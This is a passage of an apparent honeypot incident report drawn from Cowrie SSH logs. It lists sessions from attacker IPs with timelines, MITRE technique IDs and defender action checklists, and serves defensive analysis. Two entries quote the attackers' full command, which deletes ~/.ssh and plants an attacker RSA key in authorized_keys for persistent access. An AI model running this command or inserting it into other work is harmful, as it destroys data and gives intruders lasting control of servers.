| `2026-07-21 06:18:40` | `cowrie.command.input` |
| `2026-07-21 06:18:40` | `cowrie.command.input` |
| `2026-07-21 06:18:40` | `cowrie.command.input` |
| `2026-07-21 06:18:40` | `cowrie.command.input` |
| `2026-07-21 06:18:40` | `cowrie.command.success` |
| `2026-07-21 06:18:40` | `cowrie.command.input` |
| `2026-07-21 06:18:40` | `cowrie.command.input` |
| `2026-07-21 06:18:40` | `cowrie.command.input` |
| `2026-07-21 06:18:40` | `cowrie.command.input` |
| `2026-07-21 06:18:41` | `cowrie.log.closed` |
| `2026-07-21 06:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0c32ee96bd7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-21 06:18 |
| **Last Seen** | 2026-07-21 06:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:18:42` | `cowrie.session.connect` |
| `2026-07-21 06:18:42` | `cowrie.client.version` |
| `2026-07-21 06:18:42` | `cowrie.client.kex` |
| `2026-07-21 06:18:42` | `cowrie.login.success` |
| `2026-07-21 06:18:42` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:18:42` | `cowrie.direct-tcpip.data` |
| `2026-07-21 06:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4297fc6679a5

| Field | Detail |
|---|---|
| **Source IP** | `182.73.164[.]228` |
| **First Seen** | 2026-07-21 06:19 |
| **Last Seen** | 2026-07-21 06:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:19:38` | `cowrie.session.connect` |
| `2026-07-21 06:19:39` | `cowrie.client.version` |
| `2026-07-21 06:19:39` | `cowrie.client.kex` |
| `2026-07-21 06:19:41` | `cowrie.login.success` |
| `2026-07-21 06:19:42` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:19:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.73.164[.]228` to AbuseIPDB if not already reported
- [ ] Block `182.73.164[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c399f3e4965

| Field | Detail |
|---|---|
| **Source IP** | `187.218.57[.]50` |
| **First Seen** | 2026-07-21 06:19 |
| **Last Seen** | 2026-07-21 06:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:19:51` | `cowrie.session.connect` |
| `2026-07-21 06:19:52` | `cowrie.client.version` |
| `2026-07-21 06:19:52` | `cowrie.client.kex` |
| `2026-07-21 06:19:53` | `cowrie.login.success` |
| `2026-07-21 06:19:54` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.218.57[.]50` to AbuseIPDB if not already reported
- [ ] Block `187.218.57[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ff1913b93d9

| Field | Detail |
|---|---|
| **Source IP** | `106.0.166[.]123` |
| **First Seen** | 2026-07-21 06:23 |
| **Last Seen** | 2026-07-21 06:23 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:23:01` | `cowrie.session.connect` |
| `2026-07-21 06:23:02` | `cowrie.client.version` |
| `2026-07-21 06:23:02` | `cowrie.client.kex` |
| `2026-07-21 06:23:14` | `cowrie.login.success` |
| `2026-07-21 06:23:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.0.166[.]123` to AbuseIPDB if not already reported
- [ ] Block `106.0.166[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-713bdbdb8fdf

| Field | Detail |
|---|---|
| **Source IP** | `138.219.13[.]21` |
| **First Seen** | 2026-07-21 06:23 |
| **Last Seen** | 2026-07-21 06:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:23:15` | `cowrie.session.connect` |
| `2026-07-21 06:23:15` | `cowrie.client.version` |
| `2026-07-21 06:23:15` | `cowrie.client.kex` |
| `2026-07-21 06:23:16` | `cowrie.login.success` |
| `2026-07-21 06:23:17` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:23:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.219.13[.]21` to AbuseIPDB if not already reported
- [ ] Block `138.219.13[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-837c461f67b8

| Field | Detail |
|---|---|
| **Source IP** | `159.198.40[.]128` |
| **First Seen** | 2026-07-21 06:26 |
| **Last Seen** | 2026-07-21 06:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:26:42` | `cowrie.session.connect` |
| `2026-07-21 06:26:42` | `cowrie.client.version` |
| `2026-07-21 06:26:42` | `cowrie.client.kex` |
| `2026-07-21 06:26:43` | `cowrie.login.success` |
| `2026-07-21 06:26:43` | `cowrie.session.params` |
| `2026-07-21 06:26:43` | `cowrie.command.input` |
| `2026-07-21 06:26:43` | `cowrie.command.failed` |
| `2026-07-21 06:26:43` | `cowrie.log.closed` |
| `2026-07-21 06:26:44` | `cowrie.session.params` |
| `2026-07-21 06:26:44` | `cowrie.command.input` |
| `2026-07-21 06:26:44` | `cowrie.session.file_download` |
| `2026-07-21 06:26:44` | `cowrie.log.closed` |
| `2026-07-21 06:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.198.40[.]128` to AbuseIPDB if not already reported
- [ ] Block `159.198.40[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9318ff825e4

| Field | Detail |
|---|---|
| **Source IP** | `159.198.40[.]128` |
| **First Seen** | 2026-07-21 06:26 |
| **Last Seen** | 2026-07-21 06:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:26:44` | `cowrie.session.connect` |
| `2026-07-21 06:26:44` | `cowrie.client.version` |
| `2026-07-21 06:26:44` | `cowrie.client.kex` |
| `2026-07-21 06:26:45` | `cowrie.login.success` |
| `2026-07-21 06:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.198.40[.]128` to AbuseIPDB if not already reported
- [ ] Block `159.198.40[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cfa4159bbde

| Field | Detail |
|---|---|
| **Source IP** | `159.198.40[.]128` |
| **First Seen** | 2026-07-21 06:26 |
| **Last Seen** | 2026-07-21 06:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:26:45` | `cowrie.session.connect` |
| `2026-07-21 06:26:45` | `cowrie.client.version` |
| `2026-07-21 06:26:45` | `cowrie.client.kex` |
| `2026-07-21 06:26:45` | `cowrie.login.success` |
| `2026-07-21 06:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.198.40[.]128` to AbuseIPDB if not already reported
- [ ] Block `159.198.40[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad44cc116424

| Field | Detail |
|---|---|
| **Source IP** | `192.210.192[.]220` |
| **First Seen** | 2026-07-21 06:27 |
| **Last Seen** | 2026-07-21 06:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:27:45` | `cowrie.session.connect` |
| `2026-07-21 06:27:45` | `cowrie.client.version` |
| `2026-07-21 06:27:45` | `cowrie.client.kex` |
| `2026-07-21 06:27:45` | `cowrie.login.success` |
| `2026-07-21 06:27:45` | `cowrie.session.params` |
| `2026-07-21 06:27:45` | `cowrie.command.input` |
| `2026-07-21 06:27:45` | `cowrie.command.failed` |
| `2026-07-21 06:27:45` | `cowrie.log.closed` |
| `2026-07-21 06:27:46` | `cowrie.session.params` |
| `2026-07-21 06:27:46` | `cowrie.command.input` |
| `2026-07-21 06:27:46` | `cowrie.session.file_download` |
| `2026-07-21 06:27:46` | `cowrie.log.closed` |
| `2026-07-21 06:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.210.192[.]220` to AbuseIPDB if not already reported
- [ ] Block `192.210.192[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8492ffec4c47

| Field | Detail |
|---|---|
| **Source IP** | `192.210.192[.]220` |
| **First Seen** | 2026-07-21 06:27 |
| **Last Seen** | 2026-07-21 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:27:46` | `cowrie.session.connect` |
| `2026-07-21 06:27:46` | `cowrie.client.version` |
| `2026-07-21 06:27:46` | `cowrie.client.kex` |
| `2026-07-21 06:27:46` | `cowrie.login.success` |
| `2026-07-21 06:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.210.192[.]220` to AbuseIPDB if not already reported
- [ ] Block `192.210.192[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb1398d1906d

| Field | Detail |
|---|---|
| **Source IP** | `192.210.192[.]220` |
| **First Seen** | 2026-07-21 06:27 |
| **Last Seen** | 2026-07-21 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:27:46` | `cowrie.session.connect` |
| `2026-07-21 06:27:46` | `cowrie.client.version` |
| `2026-07-21 06:27:46` | `cowrie.client.kex` |
| `2026-07-21 06:27:46` | `cowrie.login.success` |
| `2026-07-21 06:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.210.192[.]220` to AbuseIPDB if not already reported
- [ ] Block `192.210.192[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cedac2e5472

| Field | Detail |
|---|---|
| **Source IP** | `222.222.124[.]164` |
| **First Seen** | 2026-07-21 06:28 |
| **Last Seen** | 2026-07-21 06:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:28:58` | `cowrie.session.connect` |
| `2026-07-21 06:28:59` | `cowrie.client.version` |
| `2026-07-21 06:28:59` | `cowrie.client.kex` |
| `2026-07-21 06:29:02` | `cowrie.login.success` |
| `2026-07-21 06:29:04` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.222.124[.]164` to AbuseIPDB if not already reported
- [ ] Block `222.222.124[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e253afa8828a

| Field | Detail |
|---|---|
| **Source IP** | `223.107.72[.]234` |
| **First Seen** | 2026-07-21 06:29 |
| **Last Seen** | 2026-07-21 06:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:29:09` | `cowrie.session.connect` |
| `2026-07-21 06:29:10` | `cowrie.client.version` |
| `2026-07-21 06:29:10` | `cowrie.client.kex` |
| `2026-07-21 06:29:13` | `cowrie.login.success` |
| `2026-07-21 06:29:14` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.107.72[.]234` to AbuseIPDB if not already reported
- [ ] Block `223.107.72[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e4ca9ba69bc

| Field | Detail |
|---|---|
| **Source IP** | `124.152.90[.]68` |
| **First Seen** | 2026-07-21 06:32 |
| **Last Seen** | 2026-07-21 06:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:32:27` | `cowrie.session.connect` |
| `2026-07-21 06:32:28` | `cowrie.client.version` |
| `2026-07-21 06:32:28` | `cowrie.client.kex` |
| `2026-07-21 06:32:30` | `cowrie.login.success` |
| `2026-07-21 06:32:31` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:32:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.152.90[.]68` to AbuseIPDB if not already reported
- [ ] Block `124.152.90[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f078f0461669

| Field | Detail |
|---|---|
| **Source IP** | `113.200.216[.]246` |
| **First Seen** | 2026-07-21 06:32 |
| **Last Seen** | 2026-07-21 06:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:32:36` | `cowrie.session.connect` |
| `2026-07-21 06:32:37` | `cowrie.client.version` |
| `2026-07-21 06:32:37` | `cowrie.client.kex` |
| `2026-07-21 06:32:39` | `cowrie.login.success` |
| `2026-07-21 06:32:40` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.200.216[.]246` to AbuseIPDB if not already reported
- [ ] Block `113.200.216[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7702ee957dd

| Field | Detail |
|---|---|
| **Source IP** | `92.62.74[.]41` |
| **First Seen** | 2026-07-21 06:42 |
| **Last Seen** | 2026-07-21 06:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:42:04` | `cowrie.session.connect` |
| `2026-07-21 06:42:04` | `cowrie.client.version` |
| `2026-07-21 06:42:04` | `cowrie.client.kex` |
| `2026-07-21 06:42:05` | `cowrie.login.success` |
| `2026-07-21 06:42:06` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:42:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.62.74[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.62.74[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fcf8f2ca0b3

| Field | Detail |
|---|---|
| **Source IP** | `14.23.77[.]27` |
| **First Seen** | 2026-07-21 06:46 |
| **Last Seen** | 2026-07-21 06:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:46:17` | `cowrie.session.connect` |
| `2026-07-21 06:46:18` | `cowrie.client.version` |
| `2026-07-21 06:46:18` | `cowrie.client.kex` |
| `2026-07-21 06:46:20` | `cowrie.login.success` |
| `2026-07-21 06:46:20` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.23.77[.]27` to AbuseIPDB if not already reported
- [ ] Block `14.23.77[.]27` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c666a53ff3a0

| Field | Detail |
|---|---|
| **Source IP** | `154.160.69[.]206` |
| **First Seen** | 2026-07-21 06:46 |
| **Last Seen** | 2026-07-21 06:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:46:25` | `cowrie.session.connect` |
| `2026-07-21 06:46:26` | `cowrie.client.version` |
| `2026-07-21 06:46:26` | `cowrie.client.kex` |
| `2026-07-21 06:46:28` | `cowrie.login.success` |
| `2026-07-21 06:46:28` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.160.69[.]206` to AbuseIPDB if not already reported
- [ ] Block `154.160.69[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ee8e07720cc

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-21 06:48 |
| **Last Seen** | 2026-07-21 06:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:48:05` | `cowrie.session.connect` |
| `2026-07-21 06:48:05` | `cowrie.client.version` |
| `2026-07-21 06:48:05` | `cowrie.client.kex` |
| `2026-07-21 06:48:06` | `cowrie.login.success` |
| `2026-07-21 06:48:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c741d33d2e6c

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-21 06:48 |
| **Last Seen** | 2026-07-21 06:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:48:05` | `cowrie.session.connect` |
| `2026-07-21 06:48:05` | `cowrie.client.version` |
| `2026-07-21 06:48:06` | `cowrie.client.kex` |
| `2026-07-21 06:48:06` | `cowrie.login.success` |
| `2026-07-21 06:48:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-601055aaa9f1

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-21 06:48 |
| **Last Seen** | 2026-07-21 06:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:48:15` | `cowrie.session.connect` |
| `2026-07-21 06:48:15` | `cowrie.client.version` |
| `2026-07-21 06:48:15` | `cowrie.client.kex` |
| `2026-07-21 06:48:16` | `cowrie.login.success` |
| `2026-07-21 06:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-befe0d91fcca

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-21 06:48 |
| **Last Seen** | 2026-07-21 06:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:48:16` | `cowrie.session.connect` |
| `2026-07-21 06:48:16` | `cowrie.client.version` |
| `2026-07-21 06:48:16` | `cowrie.client.kex` |
| `2026-07-21 06:48:17` | `cowrie.login.success` |
| `2026-07-21 06:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaebc31c0833

| Field | Detail |
|---|---|
| **Source IP** | `117.250.19[.]91` |
| **First Seen** | 2026-07-21 06:50 |
| **Last Seen** | 2026-07-21 06:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:50:26` | `cowrie.session.connect` |
| `2026-07-21 06:50:27` | `cowrie.client.version` |
| `2026-07-21 06:50:27` | `cowrie.client.kex` |
| `2026-07-21 06:50:29` | `cowrie.login.success` |
| `2026-07-21 06:50:30` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.250.19[.]91` to AbuseIPDB if not already reported
- [ ] Block `117.250.19[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1b3dae60b0c

| Field | Detail |
|---|---|
| **Source IP** | `177.174.105[.]113` |
| **First Seen** | 2026-07-21 06:53 |
| **Last Seen** | 2026-07-21 06:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:53:55` | `cowrie.session.connect` |
| `2026-07-21 06:53:56` | `cowrie.client.version` |
| `2026-07-21 06:53:56` | `cowrie.client.kex` |
| `2026-07-21 06:53:58` | `cowrie.login.success` |
| `2026-07-21 06:53:59` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.105[.]113` to AbuseIPDB if not already reported
- [ ] Block `177.174.105[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81e70318d342

| Field | Detail |
|---|---|
| **Source IP** | `180.188.253[.]150` |
| **First Seen** | 2026-07-21 06:54 |
| **Last Seen** | 2026-07-21 06:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
